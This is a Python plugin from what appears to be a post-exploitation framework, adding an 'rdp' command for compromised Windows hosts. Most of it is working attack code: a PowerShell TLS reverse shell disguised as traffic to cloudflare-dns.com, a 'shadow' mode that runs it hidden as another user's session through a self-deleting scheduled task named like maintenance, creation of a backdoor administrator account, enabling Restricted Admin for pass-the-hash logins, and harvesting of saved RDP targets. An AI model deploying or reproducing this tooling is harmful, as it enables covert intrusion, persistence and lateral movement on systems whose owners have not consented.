"""Windows Remote Desktop configuration and recent target enumeration."""

import base64
import json

from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ..api import plugin, SessionContext
from ..shared.common import format_generic_report
from ..shared.runner import parse_collector_json, run_collector_plugin


RDP_USAGE = """
RDP — Remote Desktop configuration, enumeration, and management.

Usage:
  run rdp                              Enumerate RDP configuration, status, sessions, and recent targets
  run rdp restricted-admin             Enable RDP Restricted Admin support
  run rdp start                        Enable Remote Desktop service and firewall rules
  run rdp adduser <user> <password>    Create a local user with admin and RDP access
  run rdp shadow <user|session-id> -rh <host> -rp <port>
                                       Launch a reverse shell as the target session's user
                                       (transient scheduled task, runs in that user's session)
  run rdp help

Examples:
  run rdp
  run rdp restricted-admin
  run rdp start
  run rdp adduser newuser StrongPasswordHere
  run rdp shadow admin -rh 10.0.0.5 -rp 4444
  run rdp shadow 2 -rh 10.0.0.5 -rp 4444
""".strip()

PLUGIN_INFO = RDP_USAGE


def _generate_reverse_shell_payload(callback_host: str, callback_port: int) -> str:
    """Generate the Windows PowerShell TLS reverse shell payload.

    Same payload used by the make_token plugin.
    """
    return (
        "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; "
        "$TCPClient = New-Object Net.Sockets.TCPClient('" + callback_host + "', " + str(callback_port) + ");"
        "$NetworkStream = $TCPClient.GetStream();"
        "$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));"
        "$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);"
        "if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned){$SslStream.Close();exit};"
        "$StreamWriter = New-Object IO.StreamWriter($SslStream);"
        "function WriteToStream($String){"
        "[byte[]]$script:Buffer = New-Object System.Byte[] 4096;"
        "$StreamWriter.Write($String + 'SHELL> ');"
        "$StreamWriter.Flush()"
        "};"
        "WriteToStream '';"
        "while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0){"
        "$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);"
        "$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String};"
        "WriteToStream($Output)"
        "};"
        "$StreamWriter.Close()"
    )


def _pwsh_quote(s: str) -> str:
    """Return s as a PowerShell single-quoted string."""
    return "'" + s.replace("'", "''") + "'"


def build_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$rdp=@{{}}
$recent=@()
$settings=@{{}}
$sessions=@()
try{{
  $ts='HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server'
  $rdp.Enabled=(Get-ItemProperty $ts -Name fDenyTSConnections -EA 0).fDenyTSConnections
  $rdp.Enabled=if($rdp.Enabled -eq 0){{'yes'}}else{{'no'}}
  $rdp.AllowRemoteRPC=(Get-ItemProperty $ts -Name AllowRemoteRPC -EA 0).AllowRemoteRPC
  $rdp.Port=(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name PortNumber -EA 0).PortNumber
  $rdp.NLA=(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name UserAuthentication -EA 0).UserAuthentication
  $rdp.SecurityLayer=(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name SecurityLayer -EA 0).SecurityLayer
}}catch{{}}
try{{
  $servers='HKCU:\Software\Microsoft\Terminal Server Client\Servers'
  if(Test-Path $servers){{
    Get-ChildItem $servers -EA 0|ForEach-Object{{
      $props=Get-ItemProperty $_.PSPath -EA 0
      $recent+=@{{host=$_.PSChildName;username=$props.UsernameHint;last_connected=$props}}
    }}
  }}
}}catch{{}}
try{{
  $def='HKCU:\Software\Microsoft\Terminal Server Client\Default'
  if(Test-Path $def){{
    $settings.MRU0=(Get-ItemProperty $def -Name MRU0 -EA 0).MRU0
    $settings.Addins=(Get-ItemProperty $def -EA 0|Get-Member -MemberType NoteProperty|Where-Object Name -notmatch '^PS'|Select-Object -ExpandProperty Name)
  }}
}}catch{{}}
try{{
  $fw=Get-NetFirewallRule -DisplayGroup 'Remote Desktop' -EA 0|Select-Object DisplayName,Enabled,Direction,Action
  $settings.FirewallRules=@($fw|ForEach-Object{{ @{{name=$_.DisplayName;enabled=$_.Enabled;action=$_.Action}} }})
}}catch{{}}
try{{
  $quserRaw=quser 2>$null
  if($quserRaw){{
    $lines=@($quserRaw -split "`r?`n" | Where-Object {{ $_ -match '\S' }})
    foreach($line in $lines){{
      $current=$line.StartsWith('>')
      $clean=$line.TrimStart('>',' ').Trim()
      $parts=$clean -split '\s+' | Where-Object {{ $_ -ne '' }}
      if($parts.Count -lt 4){{ continue }}
      if($parts[2] -notmatch '^\d+$'){{ continue }}
      $sessions += [ordered]@{{
        username=$parts[0]
        session_name=$parts[1]
        session_id=$parts[2]
        state=$parts[3]
        current=$current
      }}
    }}
  }}
}}catch{{
  try{{
    $raw=quser 2>$null
    if($raw){{ $settings.SessionsRaw=@($raw -split "`r?`n") }}
  }}catch{{}}
}}
$result=[ordered]@{{
  summary=@{{
    RDP_Enabled=$rdp.Enabled
    Port=$rdp.Port
    Recent_Targets=$recent.Count
    NLA=$rdp.NLA
    Sessions=$sessions.Count
  }}
  rdp_configuration=$rdp
  recent_targets=$recent
  sessions=$sessions
  client_settings=$settings
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
"""


def _build_restricted_admin_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$result=[ordered]@{{action='restricted-admin';ok=$false;output='';message=''}}
try{{
  $out=reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f 2>&1|Out-String
  $result.output=($out -replace '\s+',' ').Trim()
  if($LASTEXITCODE -eq 0){{
    $result.ok=$true
    $result.message='RDP Restricted Admin support enabled (DisableRestrictedAdmin=0)'
  }}else{{
    $result.error="reg add failed with exit code $LASTEXITCODE"
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
"""


def _build_start_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$result=[ordered]@{{action='start';ok=$false;steps=@();message=''}}
try{{
  Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' `
    -Name 'fDenyTSConnections' -Value 0 -EA Stop
  $result.steps+=@{{step='registry';ok=$true;detail='fDenyTSConnections=0'}}

  Enable-NetFirewallRule -DisplayGroup 'Remote Desktop' -EA Stop|Out-Null
  $result.steps+=@{{step='firewall';ok=$true;detail='Remote Desktop firewall rules enabled'}}

  Set-Service -Name TermService -StartupType Automatic -EA Stop
  Start-Service -Name TermService -EA Stop
  $svc=Get-Service TermService -EA 0
  $result.steps+=@{{step='service';ok=($svc.Status -eq 'Running');detail="TermService status=$($svc.Status)"}}

  $result.ok=($result.steps|Where-Object{{-not $_.ok}}).Count -eq 0
  if($result.ok){{
    $result.message='Remote Desktop enabled (registry, firewall, and TermService)'
  }}else{{
    $result.error='One or more RDP start steps failed'
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
"""


def _build_adduser_command(username: str, password: str):
    user_json, pass_json = json.dumps(username), json.dumps(password)

    return rf"""
$ErrorActionPreference='Stop'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$user={user_json};$pass={pass_json}
$result=[ordered]@{{action='adduser';ok=$false;user=$user;steps=@()}}

function NetStep($name,[string[]]$a){{
  try{{
    $o=& "$env:SystemRoot\System32\net.exe" @a 2>&1|Out-String
    $c=$LASTEXITCODE
    [ordered]@{{step=$name;ok=($c-eq 0);exit_code=$c;detail=(($o-replace'\s+',' ').Trim())}}
  }}catch{{
    [ordered]@{{step=$name;ok=$false;exit_code=-1;detail=$_.Exception.Message}}
  }}
}}

try{{
  $result.steps+=NetStep 'create_user' @('user',$user,$pass,'/add')
  $result.steps+=NetStep 'administrators' @('localgroup','Administrators',$user,'/add')
  $result.steps+=NetStep 'rdp_users' @('localgroup','Remote Desktop Users',$user,'/add')

  $failed=@($result.steps|?{{-not $_.ok}})
  $result.ok=$failed.Count-eq 0
  if($result.ok){{
    $result.message="User '$user' created with Administrators and Remote Desktop Users membership"
  }}else{{
    $result.error="Failed step(s): $(($failed|% step)-join ', ')"
  }}
}}catch{{
  $result.error=$_.Exception.Message
}}

Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
"""


def _build_shadow_command(target: str, callback_host: str, callback_port: int) -> str:
    """Build a PowerShell command that launches the reverse shell as the target session's user."""
    inner_ps = _generate_reverse_shell_payload(callback_host, callback_port)
    inner_b64 = base64.b64encode(inner_ps.encode('utf-16le')).decode()
    target_q = _pwsh_quote(target)

    return rf"""
$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'
$ConfirmPreference='None'
$start='{PLUGIN_MARK_START}';$end='{PLUGIN_MARK_END}'
$target={target_q}
$result=[ordered]@{{action='shadow';ok=$false;target=$target;steps=@()}}

# ---- 1. Find the session matching the target (username or session id) ----
$sessionUser=$null
$sessionId=$null
$sessionState=$null
try{{
  $quserOut=quser 2>$null
  if($quserOut){{
    $lines=@($quserOut -split "`r?`n" | Where-Object {{ $_ -match '\S' }})
    foreach($line in $lines){{
      $clean=$line.TrimStart('>',' ').Trim()
      $parts=$clean -split '\s+' | Where-Object {{ $_ -ne '' }}
      if($parts.Count -lt 4){{ continue }}
      if($parts[2] -notmatch '^\d+$'){{ continue }}
      $u=$parts[0]; $sid=$parts[2]; $st=$parts[3]
      if($u -eq $target -or $sid -eq $target){{
        $sessionUser=$u; $sessionId=$sid; $sessionState=$st
        break
      }}
    }}
  }}
}}catch{{}}

if(-not $sessionUser){{
  $result.error="No active RDP session found matching '$target'"
}}else{{
  $result.Add('session_user',$sessionUser)
  $result.Add('session_id',$sessionId)
  $result.Add('session_state',$sessionState)
  $result.steps+=@{{step='lookup';ok=$true;detail="user=$sessionUser id=$sessionId state=$sessionState"}}

  # ---- 2. Register transient scheduled task running as that user ----
  $taskName='SysMaintenance_'+[Guid]::NewGuid().ToString('N').Substring(0,8)
  $encCmd='{inner_b64}'

  try{{
    $action=New-ScheduledTaskAction -Execute 'powershell.exe' `
      -Argument ('-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand ' + $encCmd)
    $principal=New-ScheduledTaskPrincipal -UserId $sessionUser -LogonType Interactive -RunLevel Highest
    $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(10)
    $task=New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger
    Register-ScheduledTask -TaskName $taskName -InputObject $task -Force | Out-Null
    $result.steps+=@{{step='register_task';ok=$true;detail="registered $taskName as $sessionUser"}}

    Start-Sleep -Milliseconds 500
    Start-ScheduledTask -TaskName $taskName -EA Stop
    $result.steps+=@{{step='start_task';ok=$true;detail='task started in user session'}}

    Start-Sleep -Seconds 3
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -EA 0
    $result.steps+=@{{step='cleanup';ok=$true;detail='transient task removed'}}

    $result.ok=$true
    $result.message=("Reverse shell launched as '$sessionUser' (session $sessionId, state=$sessionState). " +
                     "Callback: {callback_host}:{callback_port}. The running process is independent of the task.")
  }}catch{{
    $result.steps+=@{{step='deploy';ok=$false;detail=$_.Exception.Message}}
    $result.error='Shadow deployment failed'
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -EA 0
  }}
}}

Write-Output ($start+(ConvertTo-Json $result -Depth 5 -Compress)+$end)
"""


def _format_action_report(data: dict) -> str:
    action = data.get('action', 'rdp')
    lines = []
    if data.get('ok'):
        lines.append(f"RDP {action}: success")
    else:
        lines.append(f"RDP {action}: failed")
    if data.get('message'):
        lines.append(str(data['message']))
    if data.get('error'):
        lines.append(f"Error: {data['error']}")
    if data.get('target'):
        lines.append(f"Target: {data['target']}")
    if data.get('session_user'):
        sid = data.get('session_id', '?')
        st = data.get('session_state', '?')
        lines.append(f"Session: user={data['session_user']} id={sid} state={st}")
    if data.get('output'):
        lines.append(str(data['output']).strip())
    for step in data.get('steps') or []:
        status = 'ok' if step.get('ok') else 'failed'
        detail = step.get('detail') or step.get('step') or ''
        label = step.get('step') or 'step'
        lines.append(f"  [{status}] {label}: {detail}".rstrip(': '))
    return '\n'.join(lines)


def _run_rdp_action(session: SessionContext, plugin_name: str, win_ps: str, timeout: float = 45.0) -> int:
    session.log_event(f'Plugin {plugin_name}: action started')
    session._handler._flush_shell(session._client_sock, timeout=1.0)

    raw = session.run_marked(
        'true',
        win_ps,
        timeout=timeout,
        start_mark=PLUGIN_MARK_START,
        end_mark=PLUGIN_MARK_END,
        strip_ws=False,
    )

    if raw is None:
        session.print(f"Plugin '{plugin_name}' failed — no response from target.", 'red')
        session.log_plugin_result(plugin_name, '', 'no response (timeout or missing markers)')
        return 1

    data = parse_collector_json(raw)
    if not data:
        session.print(f"Plugin '{plugin_name}' failed — could not parse results.", 'red')
        session.log_plugin_result(plugin_name, raw[:4000], 'parse error')
        return 1

    if data.get('error') and not data.get('ok'):
        report = _format_action_report(data)
        session.print(report, 'red')
        session.log_plugin_result(plugin_name, report, json.dumps(data, indent=2))
        return 1

    report = _format_action_report(data)
    session.print(report, 'green' if data.get('ok') else 'red')
    session.log_plugin_result(plugin_name, report, json.dumps(data, indent=2))
    session.log_command(f'run {plugin_name}', report)
    return 0 if data.get('ok') else 1


def _run_collect(session: SessionContext) -> int:
    return run_collector_plugin(
        session,
        'rdp',
        None,
        build_command,
        format_generic_report,
        timeout=35.0,
    )


def _handle_shadow(session: SessionContext, args) -> int:
    """Handle `rdp shadow <target> -rh <host> -rp <port>`."""
    if len(args) < 2:
        session.print(RDP_USAGE, 'yellow')
        session.print("Error: rdp shadow requires <user|session-id> -rh <host> -rp <port>", 'red')
        return 1

    target = args[1].strip()
    callback_host = None
    callback_port = None

    i = 2
    while i < len(args):
        a = args[i]
        if a in ('-rh', '--callback-host') and i + 1 < len(args):
            callback_host = args[i + 1].strip()
            i += 2
        elif a in ('-rp', '--callback-port') and i + 1 < len(args):
            try:
                callback_port = int(args[i + 1])
            except ValueError:
                session.print(f"Error: invalid port '{args[i + 1]}'", 'red')
                return 1
            i += 2
        else:
            session.print(f"Error: unknown argument for rdp shadow: {a}", 'red')
            session.print(RDP_USAGE, 'yellow')
            return 1

    if not target:
        session.print("Error: rdp shadow requires a non-empty target (user or session id)", 'red')
        return 1
    if not callback_host or not callback_port:
        session.print("Error: rdp shadow requires both -rh <host> and -rp <port>", 'red')
        return 1

    session.print(f"Deploying shadow reverse shell as '{target}' -> {callback_host}:{callback_port}", 'yellow')
    return _run_rdp_action(
        session,
        'rdp shadow',
        _build_shadow_command(target, callback_host, callback_port),
        timeout=90.0,
    )


@plugin.command(
    name='rdp',
    platforms=['windows'],
    description='Remote Desktop configuration, enumeration, and management (restricted-admin, start, adduser, shadow)',
)
def run(session: SessionContext, args):
    if args and args[0].strip().lower() in ('-h', '--help', 'help', '?'):
        session.print(RDP_USAGE, 'yellow')
        return 0

    if not args:
        return _run_collect(session)

    action = args[0].strip().lower()
    if action == 'restricted-admin':
        return _run_rdp_action(session, 'rdp restricted-admin', _build_restricted_admin_command())
    if action == 'start':
        return _run_rdp_action(session, 'rdp start', _build_start_command())
    if action == 'adduser':
        if len(args) < 3:
            session.print(RDP_USAGE, 'yellow')
            session.print("Error: rdp adduser requires a username and password.", 'red')
            return 1
        username = args[1].strip()
        password = args[2]
        if not username or not password:
            session.print(RDP_USAGE, 'yellow')
            session.print("Error: rdp adduser requires a non-empty username and password.", 'red')
            return 1
        return _run_rdp_action(
            session,
            'rdp adduser',
            _build_adduser_command(username, password),
        )
    if action == 'shadow':
        return _handle_shadow(session, args)

    session.print(f"Unknown rdp subcommand: {args[0]}", 'red')
    session.print(RDP_USAGE, 'yellow')
    return 1